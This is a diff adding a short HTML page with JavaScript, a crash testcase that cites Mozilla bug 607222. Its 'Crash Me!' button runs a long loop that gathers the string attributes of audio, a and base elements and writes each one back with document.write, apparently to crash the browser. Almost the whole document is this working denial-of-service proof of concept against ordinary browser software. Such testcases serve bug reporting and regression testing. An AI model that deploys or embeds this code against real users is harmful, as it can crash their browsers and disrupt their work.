@@ -1,0 +1,34 @@
+Source: https://bugzilla.mozilla.org/show_bug.cgi?id=607222 
+<html><body> 
+ <script> 
+  function getatts(str){
+    var cobj=document.createElement(str);
+    cobj.id="testcase";
+    document.body.appendChild(cobj);
+    var obj=document.getElementById("testcase");
+    var atts = new Array(); 
+    for(p in obj){
+      if(typeof(obj[p])=="string"){
+        atts.push(p);
+      }
+    }   
+    document.body.removeChild(cobj);
+    return atts;
+  }
+ 
+  function crashme() {
+    var tags = new Array("audio", "a", "base");
+    for (inx = 0; inx < 0x8964; inx++) {
+        for (i = 0; i < tags.length; i++) {
+            var atts = getatts(tags[i]);
+            for (j = 0; j < atts.length; j++) {
+                var html = "<" + tags[i] + " " + atts[j] + "=a></" + tags[i] +
+                           ">" + tags[i];
+                document.write(html);
+            }
+        }
+    }
+  }
+</script> 
+<button onclick="crashme();">Crash Me!</button> 
+</body></html> 
